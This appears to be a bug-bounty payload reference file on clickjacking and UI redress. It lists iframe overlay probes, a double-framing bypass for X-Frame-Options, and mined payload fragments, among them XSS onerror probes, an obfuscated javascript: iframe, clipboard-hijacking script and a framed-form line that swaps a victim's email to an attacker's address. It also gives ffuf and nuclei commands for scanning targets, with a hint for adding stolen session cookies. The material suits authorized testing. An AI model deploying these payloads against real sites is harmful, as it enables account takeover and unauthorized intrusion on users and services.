# Payloads — Clickjacking / UI Redress

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# Clickjacking — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `<iframe src=https://target/settings style="opacity:0.1">` + overlay button

- `frame-ancestors 'self'` missing -> any origin

- Double framing to bypass `X-Frame-Options: SAMEORIGIN`



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 1× | `{ / <a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'> / <img height=10000 width=10000></a> / }[a]` |

| 1× | `<div class="md md-file"> / <p>Full Page link</p> / <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view` |

| 1× | `{<img src>}[link]` |

| 1× | `<iframe src="//twitter.com"></iframe>` |

| 1× | `<iframe>` |

| 1× | `<html> / <iframe src=https://twitter.com/i/cards/tfw/v1/759046372544741376?cardname=promotion&autoplay_disabled=true&earned=true&lang=en&car` |

| 1× | `line 1309 : n.html('"<u>' + t + '</u>"')` |

| 1× | `https://www.<img src=x onerror='alert()'>` |

| 1× | `<iframe src=http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>` |

| 1× | `<iframe id=ifr></iframe> / <script> / ifr.onload=function(){ / console.log(ifr.contentWindow.frames.length); / } / </script>` |

| 1× | `<script> / setInterval(function(){ / / navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)}); / },1000) / </scrip` |

| 1× | `<<!<script>iframe src=javajavascriptscript:alert(document.domain)>` |

| 1× | `navigator.clipboard.writeText()` |

| 1× | `<html> / <title>Clickjacking</title> / <body> / <iframe src="https://refer.wordpress.com/affiliate-network/campaign-settings/"></iframe> / <` |

| 1× | `<iframe src="https://sso.semrush.com/"></iframe>` |

| 1× | `https://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E` |

| 1× | `<img src=x onerror=alert(1)>` |

| 1× | `MyIFrameDoc.document.getElementById("your-profile").email.value="attacker_rewanthcool@gmail.com` |

| 1× | `https://gitlab.com@example.com` |

| 1× | `@gronke` |



## Parameters observed



`oauth_token` · `id` · `subcat` · `previous_url` · `hl` · `sl` · `tl` · `Bi06UejC9N` · `continue` · `client_id` · `response_type` · `redirect_uri` · `cardname` · `autoplay_disabled` · `earned` · `lang` · `card_height` · `message` · `userid` · `depth`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_clickjacking.txt` | 98 |

| `~/.local/share/hackerone-reports/wordlists/params_clickjacking.txt` | 48 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_clickjacking.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_clickjacking.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Scanner hits are only a signal; build a framed PoC on a sensitive action and confirm it executes.



```sh

nuclei -u https://target -tags clickjacking,headers \

       -severity low,medium,high,critical -rl 40 -o nuclei_clickjacking.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_clickjacking_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
